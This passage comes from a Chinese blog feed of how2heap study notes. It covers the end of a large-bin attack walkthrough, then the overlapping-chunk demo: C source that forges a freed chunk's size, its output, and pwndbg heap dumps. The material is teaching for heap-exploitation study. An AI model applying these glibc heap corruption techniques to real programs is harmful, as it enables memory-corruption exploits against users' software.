class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; bins<br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x30</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x40</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x50</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x60</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x70</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x80</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span>: <span class="hljs-number">0</span>x6037a0 —▸ <span class="hljs-number">0</span>x6030a0 —▸ <span class="hljs-number">0</span>x7ffff7dd1b78 (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0</span>x6037a0<br><span class="hljs-attribute">smallbins</span><br><span class="hljs-attribute">empty</span><br><span class="hljs-attribute">largebins</span><br><span class="hljs-attribute">0x400</span><span class="hljs-meta"> [corrupted]</span><br><span class="hljs-attribute">FD</span>: <span class="hljs-number">0</span>x603360 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">BK</span>: <span class="hljs-number">0</span>x603360 —▸ <span class="hljs-number">0</span>x7fffffffe5b0 ◂— <span class="hljs-number">0</span>x0<br></code></pre></td></tr></table></figure><p>然后我们再malloc一下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; bins<br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x30</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x40</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x50</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x60</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x70</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x80</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span>: <span class="hljs-number">0</span>x603140 —▸ <span class="hljs-number">0</span>x7ffff7dd1b78 (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0</span>x603140 /* &#x27;@<span class="hljs-number">1</span>`&#x27; */<br><span class="hljs-attribute">smallbins</span><br><span class="hljs-attribute">empty</span><br><span class="hljs-attribute">largebins</span><br><span class="hljs-attribute">0x400</span><span class="hljs-meta"> [corrupted]</span><br><span class="hljs-attribute">FD</span>: <span class="hljs-number">0</span>x603360 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">BK</span>: <span class="hljs-number">0</span>x603360 —▸ <span class="hljs-number">0</span>x6037a0 —▸ <span class="hljs-number">0</span>x7fffffffe5b0 ◂— <span class="hljs-number">0</span>x6037a0<br></code></pre></td></tr></table></figure><p>此时目标已经被修改了</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; x/10gx &amp;stack_var1<br><span class="hljs-number">0x7fffffffe5c0</span>: <span class="hljs-number">0x00000000006037a0</span>      <span class="hljs-number">0x00000000006037a0</span><br><span class="hljs-number">0x7fffffffe5d0</span>: <span class="hljs-number">0x0000000000603010</span>      <span class="hljs-number">0x0000000000603370</span><br><span class="hljs-number">0x7fffffffe5e0</span>: <span class="hljs-number">0x00000000006037b0</span>      <span class="hljs-number">0xd047b69e2685f100</span><br><span class="hljs-number">0x7fffffffe5f0</span>: <span class="hljs-number">0x0000000000400a30</span>      <span class="hljs-number">0x00007ffff7a2d830</span><br><span class="hljs-number">0x7fffffffe600</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00007fffffffe6d8</span><br>pwndbg&gt; x/10gx &amp;stack_var2<br><span class="hljs-number">0x7fffffffe5c8</span>: <span class="hljs-number">0x00000000006037a0</span>      <span class="hljs-number">0x0000000000603010</span><br><span class="hljs-number">0x7fffffffe5d8</span>: <span class="hljs-number">0x0000000000603370</span>      <span class="hljs-number">0x00000000006037b0</span><br><span class="hljs-number">0x7fffffffe5e8</span>: <span class="hljs-number">0xd047b69e2685f100</span>      <span class="hljs-number">0x0000000000400a30</span><br><span class="hljs-number">0x7fffffffe5f8</span>: <span class="hljs-number">0x00007ffff7a2d830</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffffffe608</span>: <span class="hljs-number">0x00007fffffffe6d8</span>      <span class="hljs-number">0x0000000100000000</span><br>pwndbg&gt; p/x stack_var1<br><span class="hljs-number">$20</span> = <span class="hljs-number">0x6037a0</span><br>pwndbg&gt; p/x stack_var2<br><span class="hljs-number">$21</span> = <span class="hljs-number">0x6037a0</span><br></code></pre></td></tr></table></figure><h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>本例中,程序先是在栈上创建了两个变量stack_var1和stack_var2并赋初值为0,这两个变量就是即将要被覆写的变量</p><p>随后申请了一个large chunk p1,然后又申请了一个小chunk来避免后面的操作引发合并,之后又申请了一个large chunk p2,之后还是一个避免合并的小chunk,下面申请p3的操作类似</p><p>随后程序释放了p1,p2,此时两个chunk被链入unsorted bin中</p><p>之后为了将p2放入large bin,程序又申请了一个小chunk对p1进行切割,一部分还给用户,一部分继续放进unsorted bin中,然后系统将p2放入了large bin中</p><p>之后Free掉了p3,现在p3也在unsorted bin中</p><p>好了,现在程序伪造了p2的内容,将p2-&gt;bk_nextsize指向stack2-4,p2-&gt;bk指向stack1-2</p><p>再malloc一个小chunk,这个时候程序就会将p3放入large bin中,系统就会调用从unsorted bin中取出large bin的操作,将堆地址存入栈上的地址</p><p>over~</p><p>文章首发于安全客，转载请著名出处，文章链接<a href="https://www.anquanke.com/post/id/197649">https://www.anquanke.com/post/id/197649</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>how2heap总结系列三</title>
    <link href="/2020/01/20/how2heap%E6%80%BB%E7%BB%93%E7%B3%BB%E5%88%97%E4%B8%89/"/>
    <url>/2020/01/20/how2heap%E6%80%BB%E7%BB%93%E7%B3%BB%E5%88%97%E4%B8%89/</url>
    
    <content type="html"><![CDATA[<blockquote><p>接上一篇的unink,继续复习计划</p></blockquote><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>ctf-wiki.github.io<span class="hljs-regexp">/ctf-wiki/</span><br></code></pre></td></tr></table></figure><h1 id="0x0-overlapping-chunk"><a href="#0x0-overlapping-chunk" class="headerlink" title="0x0 overlapping_chunk"></a>0x0 overlapping_chunk</h1><h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>overlapping在平常算是最常用的技巧了,几乎每一道题都需要构造overlap</p><p>而提到overlapping就不得不说chunk shrink和chunk extend了,其实这两个都是依靠更改chunk的pre_size域和size域来欺骗ptmalloc的</p><p>详情可见,<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/chunk_extend_overlapping-zh/#4extendoverlapping">文章一</a>,<a href="https://nightrainy.github.io/2019/07/25/chunk-extend-and-overlapping/">文章二</a></p><p>好了,回过来,我们继续看本例</p><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p>我们还是先看源代码吧,同样的,我删了写东西并加了一小点翻译(雾</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span>* argv[])</span></span>&#123;<br>        <span class="hljs-type">intptr_t</span> *p1,*p2,*p3,*p4;<br><br>        p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br>        p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br>        p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span> - <span class="hljs-number">8</span>);<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n&quot;</span>, p1, p2, p3);<br><br>        <span class="hljs-built_in">memset</span>(p1, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br>        <span class="hljs-built_in">memset</span>(p2, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br>        <span class="hljs-built_in">memset</span>(p3, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-number">0x80</span> - <span class="hljs-number">8</span>);<br><br>        <span class="hljs-built_in">free</span>(p2);<br>        <span class="hljs-comment">// p2现在在unsorted bin中,时刻准备为新的malloc服务</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n&quot;</span>);                   <br><br>        <span class="hljs-comment">// 现在模拟一下溢出来覆写p2的size                                                                               </span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now let&#x27;s simulate an overflow that can overwrite the size of the\nchunk freed p2.\n&quot;</span>);     <br>        <br>        <span class="hljs-comment">//对实例程序而言,最后三个字节是什么并不重要,然而,我们最好还是维持一下堆的稳定性</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;For a toy program, the value of the last 3 bits is unimportant;&quot;</span><br>                <span class="hljs-string">&quot; however, it is best to maintain the stability of the heap.\n&quot;</span>);<br><br>        <span class="hljs-comment">//为了维持堆的稳定性,我们还是要把prev_inuse标志位设位1来确保我们的p1不会被错误的认为是一个free chunk</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),&quot;</span><br>                <span class="hljs-string">&quot; to assure that p1 is not mistaken for a free chunk.\n&quot;</span>);<br><br>        <span class="hljs-type">int</span> evil_chunk_size = <span class="hljs-number">0x181</span>;<br>        <span class="hljs-type">int</span> evil_region_size = <span class="hljs-number">0x180</span> - <span class="hljs-number">8</span>;<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n&quot;</span>,                                                                                                                       evil_chunk_size, evil_region_size);<br><br>        *(p2<span class="hljs-number">-1</span>) = evil_chunk_size; <span class="hljs-comment">// we are overwriting the &quot;size&quot; field of chunk p2</span><br><br>        <span class="hljs-comment">//现在我们分配一个和p2被注入的size一样的大小的chunk</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nNow let&#x27;s allocate another chunk with a size equal to the data\n&quot;</span><br>               <span class="hljs-string">&quot;size of the chunk p2 injected size\n&quot;</span>);<br><br>        这次的malloc将会从我们刚刚修改过size的unsoted bin中取出<span class="hljs-function">free chunk</span><br><span class="hljs-function">        <span class="hljs-title">fprintf</span><span class="hljs-params">(stderr, <span class="hljs-string">&quot;This malloc will be served from the previously freed chunk that\n&quot;</span></span></span><br><span class="hljs-params"><span class="hljs-function">               <span class="hljs-string">&quot;is parked in the unsorted bin which size has been modified by us\n&quot;</span>)</span></span>;<br>        p4 = <span class="hljs-built_in">malloc</span>(evil_region_size);<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\np4 has been allocated at %p and ends at %p\n&quot;</span>, (<span class="hljs-type">char</span> *)p4, (<span class="hljs-type">char</span> *)p4+evil_region_size);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;p3 starts at %p and ends at %p\n&quot;</span>, (<span class="hljs-type">char</span> *)p3, (<span class="hljs-type">char</span> *)p3<span class="hljs-number">+0x80</span><span class="hljs-number">-8</span>);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;p4 should overlap with p3, in this case p4 includes all p3.\n&quot;</span>);<br><br>        <span class="hljs-comment">//现在我们写进p4的内容就可以覆盖p3啦,同时,我们写到p3里的内容也可以修改p4的内容</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,&quot;</span><br>                <span class="hljs-string">&quot; and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n&quot;</span>);<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Let&#x27;s run through an example. Right now, we have:\n&quot;</span>);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;p4 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p4);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;p3 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p3);<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nIf we memset(p4, &#x27;4&#x27;, %d), we have:\n&quot;</span>, evil_region_size);<br>        <span class="hljs-built_in">memset</span>(p4, <span class="hljs-string">&#x27;4&#x27;</span>, evil_region_size);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;p4 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p4);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;p3 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p3);<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nAnd if we then memset(p3, &#x27;3&#x27;, 80), we have:\n&quot;</span>);<br>        <span class="hljs-built_in">memset</span>(p3, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-number">80</span>);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;p4 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p4);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;p3 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p3);<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs 1c">This is a simple chunks overlapping problem<br><br>Let&#x27;s start to allocate 3 chunks on the heap<br>The 3 chunks have been allocated here:<br>p1=0x7aa010<br>p2=0x7aa110<br>p3=0x7aa210<br><br>Now let&#x27;s free the chunk p2<br>The chunk p2 is now in the unsorted bin ready to serve possible<br>new malloc<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span> of its size<br>Now let&#x27;s simulate an overflow that can overwrite the size of the<br>chunk freed p2.<br>For a toy program, the value of the last 3 bits is unimportant; however, it is best to maintain the stability of the heap.<br>To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse), to assure that p1 is not mistaken for a free chunk.<br>We are going to set the size of chunk p2 to to 385, which gives us<br>a region size of 376<br><br>Now let&#x27;s allocate another chunk with a size equal to the data<br>size of the chunk p2 injected size<br>This malloc will be served from the previously freed chunk that<br>is parked in the unsorted bin which size has been modified by us<br><br>p4 has been allocated at <span class="hljs-number">0</span>x7aa110 and ends at <span class="hljs-number">0</span>x7aa288<br>p3 starts at <span class="hljs-number">0</span>x7aa210 and ends at <span class="hljs-number">0</span>x7aa288<br>p4 should overlap with p3<span class="hljs-punctuation">,</span> in this case p4 includes all p3.<br><br>Now everything copied inside chunk p4 can overwrites data on<br>chunk p3<span class="hljs-punctuation">,</span> and data written to chunk p3 can overwrite data<br>stored in the p4 chunk.<br><br>Let&#x27;s run through an example. Right now, we have:<br>p4 = xK&lt;5       <br>3 = <span class="hljs-number">33333333333333</span><span class="hljs-number">33333333333333</span><span class="hljs-number">33333333333333</span><span class="hljs-number">33333333333333</span><span class="hljs-number">33333333333333</span><span class="hljs-number">33333333333333</span><span class="hljs-number">33333333333333</span><span class="hljs-number">33333333333333</span><span class="hljs-number">33333333</span><br><br>If we memset(p4, &#x27;<span class="hljs-number">4</span>&#x27;, 376), we have:<br>p4 = <span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span>44<span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444</span>4<br>3 = <span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444</span><br><br>And if we then memset(p3, &#x27;<span class="hljs-number">3</span>&#x27;, 80), we have:<br>p4 = <span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span>44<span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">43333333333333</span><span class="hljs-number">33333333333333</span><span class="hljs-number">33333333333333</span><span class="hljs-number">33333333333333</span><span class="hljs-number">33333333333333</span><span class="hljs-number">33333333333444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444</span>4<br>3 = <span class="hljs-number">33333333333333</span><span class="hljs-number">33333333333333</span><span class="hljs-number">33333333333333</span><span class="hljs-number">33333333333333</span><span class="hljs-number">33333333333333</span><span class="hljs-number">33333333334444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444444444</span><span class="hljs-number">44444444</span><br></code></pre></td></tr></table></figure><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>因为程序比较简单,我这里就仅作几个断点来调试本例</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp">► <span class="hljs-number">24</span>   p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span> - <span class="hljs-number">8</span>);<br><br>  <span class="hljs-number">28</span>   <span class="hljs-built_in">memset</span>(p1, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br>  <span class="hljs-number">29</span>   <span class="hljs-built_in">memset</span>(p2, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br>  <span class="hljs-number">30</span>   <span class="hljs-built_in">memset</span>(p3, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-number">0x80</span> - <span class="hljs-number">8</span>);<br>  <span class="hljs-number">31</span><br>► <span class="hljs-number">32</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nNow let&#x27;s free the chunk p2\n&quot;</span>);<br><br>  <span class="hljs-number">33</span>   <span class="hljs-built_in">free</span>(p2);<br>► <span class="hljs-number">34</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n&quot;</span>);<br><br>  <span class="hljs-number">47</span>   *(p2<span class="hljs-number">-1</span>) = evil_chunk_size; <span class="hljs-comment">// we are overwriting the &quot;size&quot; field of chunk p2</span><br>  <span class="hljs-number">48</span><br>► <span class="hljs-number">49</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nNow let&#x27;s allocate another chunk with a size equal to the data\n&quot;</span><br><br>  <span class="hljs-number">53</span>   p4 = <span class="hljs-built_in">malloc</span>(evil_region_size);<br>  <span class="hljs-number">54</span><br>► <span class="hljs-number">55</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\np4 has been allocated at %p and ends at %p\n&quot;</span>, (<span class="hljs-type">char</span> *)p4, (<span class="hljs-type">char</span> *)p4+evil_region_size);<br><br>► <span class="hljs-number">67</span>   <span class="hljs-built_in">memset</span>(p4, <span class="hljs-string">&#x27;4&#x27;</span>, evil_region_size);<br><br>  <span class="hljs-number">71</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nAnd if we then memset(p3, &#x27;3&#x27;, 80), we have:\n&quot;</span>);<br>► <span class="hljs-number">72</span>   <span class="hljs-built_in">memset</span>(p3, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-number">80</span>);<br><br>► <span class="hljs-number">72</span>   <span class="hljs-built_in">memset</span>(p3, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-number">80</span>);<br>  <span class="hljs-number">73</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;p4 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p4);<br>  <span class="hljs-number">74</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;p3 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p3);<br></code></pre></td></tr></table></figure><p>好了,先malloc3个chunk,p1,p2,p3,此时的堆</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x603000</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">257</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603100</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">257</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603200</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">129</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603280</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">134529</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>然后给三个chunk赋初值</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 